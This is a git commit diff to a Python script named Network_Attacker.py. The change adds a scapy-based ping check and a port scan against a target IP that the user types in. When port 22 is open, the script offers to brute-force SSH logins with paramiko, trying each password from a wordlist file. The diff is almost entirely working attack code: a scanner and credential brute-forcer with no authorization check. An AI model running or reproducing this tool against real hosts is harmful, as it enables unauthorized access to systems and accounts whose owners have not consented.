e032949cbe2ce5b5b3b08885e9171fa25f3cf5b9
YanivBuzaglo <yaniv5231@gmail.com>
2022-07-16 23:23:29 +0300

    update

--- Network_Attacker.py
+++ Network_Attacker.py
@@ -5,12 +5,13 @@ from tkinter import E
 from scapy.all import *
 from scapy.layers.inet import TCP, IP, Ether, ICMP
 from scapy.layers.l2 import ARP
+import paramiko
 
 # Asking the user for target ip address
 target = input("Please insert your target IP: ==> ")
 
 # Creating variable that equals to all registered ports
-Registered_Ports = range(1,1025)
+Registered_Ports = range(1,100)
 
 # Creating an empty list by name Open_Ports
 Open_Ports = []
@@ -36,4 +37,39 @@ def target_availability():
         Send_Ping = sr1(IP(dst=target)/ICMP(),timeout=3)
     except Exception as e:
         print(e)
-    return False
+        return False
+
+    if Send_Ping:
+            return True
+target_availa = target_availability()
+def main():
+    if target_availa == True:
+        for port in Registered_Ports:
+            status = ScanPort(port)
+            if status == True:
+                Open_Ports.append(port)
+        print(f"The scan is complete, the open ports on the target scanned are:\n{Open_Ports}")
+        if 22 in Open_Ports:
+            port = 22
+            brt_frc = input("The scan discovered that port 22 is open would you like to preform brute force on that port? yes/no ==> ")
+            if brt_frc == "yes" or brt_frc == "Yes" or brt_frc == "y" or brt_frc == "y":
+                BruteForce(port)
+            else:
+                print("BYE!")
+                exit()
+def BruteForce(port):
+    with open("PasswordList.txt","r") as myfile:
+        passwords = myfile.read()
+        passwords = passwords.split()
+        user = input("Please insert the user name you want to preform brute force with : ==> ")
+    SSHconn = paramiko.SSHClient()
+    SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    for password in passwords:
+        try:
+            SSHconn.connect(target, port=int(port), username=user, password=password, timeout=1)
+            print(f"Success, the {password} logged you in the server!")
+            SSHconn.close()
+            break
+        except Exception:
+            print(f"The {password} failed!")
+main()
